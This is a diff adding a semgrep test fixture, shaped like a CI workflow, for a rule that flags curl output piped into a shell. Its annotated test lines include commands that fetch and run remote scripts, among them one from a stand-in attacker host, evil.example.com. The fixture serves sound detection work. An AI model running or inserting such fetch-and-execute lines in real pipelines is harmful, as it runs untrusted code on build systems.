@@ -1,0 +1,55 @@
+# Test fixture for mcm-ci-curl-pipe-shell (semgrep --test). Intentionally-insecure sample —
+# excluded from the product scan via .semgrepignore (`security`). Not a real workflow.
+#
+# Every `run:` body below is wrapped in the ci-log-step heredoc ON PURPOSE. That wrapper is what
+# blinded the community rule this one replaces: its Bash sub-parser abandons the block instead of
+# matching inside it. A fixture written WITHOUT the wrapper would pass against a rule that is blind
+# to every real workflow in this repository.
+jobs:
+  probe:
+    steps:
+      # ── Caught: an unknown host ─────────────────────────────────────────────
+      - run: |
+          bash scripts/ci-log-step.sh probe-unknown-host bash -e /dev/stdin <<'CI_LOG_STEP'
+          # ruleid: mcm-ci-curl-pipe-shell
+          curl -LsSf https://evil.example.com/install.sh | sh
+          CI_LOG_STEP
+
+      # ── Caught: an accepted host, but UNPINNED ──────────────────────────────
+      # The live near-miss on item #224: PR #272 nearly added exactly this, and the blinded rule
+      # would not have objected. The acceptance is for a VERSIONED path, not for the host.
+      - run: |
+          bash scripts/ci-log-step.sh probe-unpinned bash -e /dev/stdin <<'CI_LOG_STEP'
+          # ruleid: mcm-ci-curl-pipe-shell
+          curl -LsSf https://astral.sh/uv/install.sh | sh
+          CI_LOG_STEP
+
+      # ── Caught: piping into bash reads the same as piping into sh ───────────
+      - run: |
+          bash scripts/ci-log-step.sh probe-bash bash -e /dev/stdin <<'CI_LOG_STEP'
+          # ruleid: mcm-ci-curl-pipe-shell
+          curl -Ls https://example.invalid/setup | bash
+          CI_LOG_STEP
+
+      # ── Accepted: the pinned uv installer ───────────────────────────────────
+      - run: |
+          bash scripts/ci-log-step.sh probe-pinned-uv bash -e /dev/stdin <<'CI_LOG_STEP'
+          # ok: mcm-ci-curl-pipe-shell
+          curl -LsSf https://astral.sh/uv/0.12.10/install.sh | sh
+          CI_LOG_STEP
+
+      # ── Accepted: rustup, whose toolchain comes from rust-toolchain.toml ────
+      - run: |
+          bash scripts/ci-log-step.sh probe-rustup bash -e /dev/stdin <<'CI_LOG_STEP'
+          # ok: mcm-ci-curl-pipe-shell
+          curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --profile minimal --default-toolchain none
+          CI_LOG_STEP
+
+      # ── Accepted: a curl that is not piped into a shell at all ──────────────
+      - run: |
+          bash scripts/ci-log-step.sh probe-not-a-pipe bash -e /dev/stdin <<'CI_LOG_STEP'
+          # ok: mcm-ci-curl-pipe-shell
+          curl -sSfL https://example.com/data.json -o data.json
+          # ok: mcm-ci-curl-pipe-shell
+          curl -s https://example.com/x | jq .name
+          CI_LOG_STEP
